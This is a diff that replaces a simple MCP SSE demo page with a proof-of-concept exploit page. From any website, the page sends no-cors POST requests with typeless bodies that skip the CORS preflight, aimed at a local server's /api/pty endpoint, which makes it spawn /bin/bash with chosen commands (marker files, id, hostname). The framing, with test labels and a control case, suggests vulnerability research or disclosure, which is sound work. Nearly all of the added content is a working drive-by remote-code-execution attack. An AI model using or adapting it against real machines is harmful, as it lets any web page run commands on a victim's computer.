@@ -1,176 +1,72 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Web Project</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-        }
-        nav {
-            background-color: #333;
-            color: white;
-            padding: 10px;
-            display: flex;
-            justify-content: space-around;
-        }
-        nav a {
-            color: white;
-            text-decoration: none;
-            padding: 5px 10px;
-        }
-        nav a:hover {
-            background-color: #555;
-        }
-        section {
-            padding: 20px;
-        }
-    </style>
+<html>
+<head><meta charset="utf-8"><title>Arbitrary-Origin One-POST RCE — Content-Type-omission CORS bypass</title>
+<style>body{font-family:monospace;background:#111;color:#f80;padding:2rem}pre{background:#000;padding:1rem;border:1px solid #333;white-space:pre-wrap}</style>
 </head>
 <body>
-    <nav>
-        <a href="#home" onclick="navigateTo('home')">Home</a>
-        <a href="#about" onclick="navigateTo('about')">About</a>
-        <a href="#sse" onclick="navigateTo('sse')">SSE Demo</a>
-    </nav>
-    <section id="app">
-        <!-- Content will be dynamically injected here -->
-    </section>
+<h2>Test C: page from an origin the CORS allowlist does NOT trust — no preflight RCE</h2>
+<p>Origin: <span id="origin"></span></p>
+<p>This page does NOT need a ptyID, a WebSocket, a trusted origin, or a readable
+response. It sends a single <code>no-cors</code> POST whose body is a
+<code>Uint8Array</code> (typeless body &rarr; browser sets <b>no Content-Type
+header</b> &rarr; CORS <i>simple request</i>, no preflight). The server's
+payload decoder falls back to <code>application/json</code> when the header is
+absent, so the JSON is accepted, and <code>pty.create</code> spawns the
+process on creation — fire-and-forget RCE.</p>
+<pre id="log">starting...</pre>
+<script>
+const log = document.getElementById("log");
+document.getElementById("origin").textContent = window.location.origin;
+function append(s) { log.textContent += s + "\n"; }
 
-    <script>
-        const MCP_SERVER_URL = 'http://localhost:5008/sse';
+const DIR = encodeURIComponent(JSON.stringify({ directory: "/home/lima.guest/work/opencode" }));
+// Direct query-string form (matches the working curl PoC):
+const QUERY = "location%5Bdirectory%5D=%2Fhome%2Flima.guest%2Fwork%2Fopencode";
 
-        async function sendMcpMessage(message) {
-            try {
-                const response = await fetch(MCP_SERVER_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'Accept': 'application/json, text/event-stream'
-                    },
-                    body: JSON.stringify(message)
-                });
+async function fireNoCorsPost(label, mkBody) {
+  append("[" + label + "] POST no-cors (no Content-Type) to pty.create ...");
+  try {
+    const resp = await fetch(
+      "http://127.0.0.1:4096/api/pty?" + QUERY,
+      {
+        method: "POST",
+        mode: "no-cors",
+        body: mkBody(),
+      },
+    );
+    append("[" + label + "] fetch resolved (opaque response, type=" + resp.type + " status=" + resp.status + ").");
+  } catch (e) {
+    append("[" + label + "] fetch threw: " + e);
+  }
+}
 
-                if (response.status === 200) {
-                    console.log("Server accepted notification/response batch.");
-                    return null;
-                } else if (response.ok) {
-                    const contentType = response.headers.get('Content-Type');
-                    if (contentType && contentType.includes('application/json')) {
-                        const responseData = await response.json();
-                        console.log("Received immediate JSON response:", responseData);
-                        return responseData;
-                    } else if (contentType && contentType.includes('text/event-stream')) {
-                        console.log("Server initiated an SSE stream in response to POST.");
-                        return null;
-                    } else {
-                        console.warn(`Received unexpected Content-Type: ${contentType}`);
-                        return null;
-                    }
-                } else {
-                    console.error(`HTTP error sending message: ${response.status} ${response.statusText}`);
-                    try {
-                        const errorBody = await response.json();
-                        console.error("Error details:", errorBody);
-                    } catch (e) {
-                        console.error("Could not parse error body as JSON.");
-                    }
-                    throw new Error(`Failed to send message: ${response.status}`);
-                }
-            } catch (error) {
-                console.error('Error sending message:', error);
-                throw error;
-            }
-        }
+async function run() {
+  append("document origin: " + window.location.origin);
 
-        function startMcpListener() {
-            const eventSource = new EventSource(MCP_SERVER_URL);
+  // Variant 1: Uint8Array body — fetch sets no Content-Type for BufferSource bodies.
+  await fireNoCorsPost("U8", () =>
+    new TextEncoder().encode(JSON.stringify({
+      command: "/bin/bash",
+      args: ["-c", "touch /tmp/arbitrary-site-rce-marker-u8; id > /tmp/arbitrary-site-rce-marker-u8; hostname >> /tmp/arbitrary-site-rce-marker-u8"],
+    })),
+  );
 
-            eventSource.onopen = () => {
-                console.log('SSE connection opened.');
-            };
+  // Variant 2: typeless Blob — empty Blob type means no Content-Type header.
+  await fireNoCorsPost("BLOB", () =>
+    new Blob([JSON.stringify({
+      command: "/bin/bash",
+      args: ["-c", "touch /tmp/arbitrary-site-rce-marker-blob"],
+    })]),
+  );
 
-            eventSource.onmessage = (event) => {
-                console.log('SSE message received:', event);
-                try {
-                    const mcpMessage = JSON.parse(event.data);
-                    console.log('Parsed MCP message:', mcpMessage);
-                    handleReceivedMcpMessage(mcpMessage);
-                } catch (e) {
-                    console.error('Error parsing SSE message data:', e);
-                }
-            };
+  // Control: text/plain body (Content-Type: text/plain;charset=UTF-8) — expected to 415 server-side.
+  await fireNoCorsPost("CTRL-text/plain", () =>
+    JSON.stringify({ command: "/bin/bash", args: ["-c", "touch /tmp/arbitrary-site-rce-marker-ctrl"] }),
+  );
 
-            eventSource.onerror = (error) => {
-                console.error('SSE error:', error);
-                eventSource.close();
-                console.log('SSE connection closed due to error.');
-            };
-
-            eventSource.onclose = () => {
-                console.log('SSE connection closed.');
-            };
-
-            console.log('Attempting to connect to SSE listener...');
-            return eventSource;
-        }
-
-        function handleReceivedMcpMessage(message) {
-            if (Array.isArray(message)) {
-                console.log("Handling batch of messages:", message);
-                message.forEach(msg => processSingleMcpMessage(msg));
-            } else {
-                processSingleMcpMessage(message);
-            }
-        }
-
-        function processSingleMcpMessage(message) {
-            console.log("Processing single message:", message);
-            if (message.jsonrpc !== "2.0") {
-                console.error("Received non-JSON-RPC 2.0 message:", message);
-                return;
-            }
-
-            if (message.method && message.id !== undefined) {
-                console.log("Received a Request from server:", message);
-            } else if (message.method && message.id === undefined) {
-                console.log("Received a Notification from server:", message);
-            } else if (message.id !== undefined && (message.result !== undefined || message.error !== undefined)) {
-                console.log("Received a Response from server:", message);
-            } else {
-                console.warn("Received unrecognized JSON-RPC message type:", message);
-            }
-        }
-
-        const mcpEventListener = startMcpListener();
-
-        async function exampleInteraction() {
-            const listStorageAccountsRequest = {
-                jsonrpc: "2.0",
-                id: "req-1",
-                method: "tools/call",
-                params: {
-                    name: "azmcp-bestpractices-get"
-                }
-            };
-
-            console.log("Sending request to list storage accounts...");
-            try {
-                const response = await sendMcpMessage(listStorageAccountsRequest);
-                if (response) {
-                    console.log("Storage accounts request completed via immediate response:", response);
-                } else {
-                    console.log("Storage accounts request sent. Awaiting response/notifications on SSE stream...");
-                }
-            } catch (error) {
-                console.error("Failed to send storage accounts request:", error);
-            }
-        }
-
-        setTimeout(exampleInteraction, 2000);
-    </script>
+  append("done — check /tmp/arbitrary-site-rce-marker-* on the server host.");
+}
+run();
+</script>
 </body>
 </html>
